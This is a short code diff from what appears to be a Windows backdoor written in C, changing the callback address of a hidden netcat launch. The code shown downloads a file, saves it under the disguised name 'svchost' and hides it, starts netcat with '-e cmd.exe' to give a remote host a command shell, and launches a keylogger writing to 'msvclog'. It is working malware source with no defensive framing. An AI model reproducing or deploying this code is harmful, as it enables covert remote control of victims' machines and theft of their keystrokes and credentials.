@@ -78,7 +78,7 @@ int main(int argc, char* argv[])
     DownloadFile((const char *)svchost_url, svchost_path);
     SetFileAttributes(svchost_path, FILE_ATTRIBUTE_HIDDEN);
 
-    const char *nc_params = "-d 192.168.11.135 6666 -e C:\\Windows\\System32\\cmd.exe";
+    const char *nc_params = "-d 192.168.58.123 6666 -e C:\\Windows\\System32\\cmd.exe";
     ShellExecute(NULL, "open", nc_path, nc_params, NULL, SW_HIDE);
 
     const char *kylg_params = "--out-log msvclog";
